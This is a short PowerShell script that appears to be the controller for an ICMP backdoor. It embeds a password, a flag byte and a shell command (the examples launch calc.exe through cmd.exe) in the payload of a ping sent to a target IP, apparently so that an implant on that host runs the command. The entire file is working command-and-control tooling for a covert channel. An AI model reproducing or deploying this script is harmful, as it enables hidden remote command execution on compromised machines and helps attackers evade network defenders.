# Exec with the flag set:      .\CustomPing.ps1 -target 10.10.20.3 -password 0x71,0x72,0x73,0x74 -flag -cmd "cmd.exe /c calc.exe"
# Exec with the flag NOT set:  .\CustomPing.ps1 -target 10.10.20.3 -password 0x71,0x72,0x73,0x74 -cmd "cmd.exe /c calc.exe"

param(
    [Parameter(Mandatory=$True)]
    [string]$target,
 
    [Parameter(Mandatory=$True)]
    [int[]]$password,

    [Parameter(Mandatory=$False)]
    [switch]$flag,

    [Parameter(Mandatory=$True)]
    [string]$cmd
)

$data = $password + $(If ($flag) {0x01} Else {0x00}) + [Text.Encoding]::ASCII.GetBytes($cmd)
(New-Object System.Net.NetworkInformation.Ping).Send($target, 5000, $data)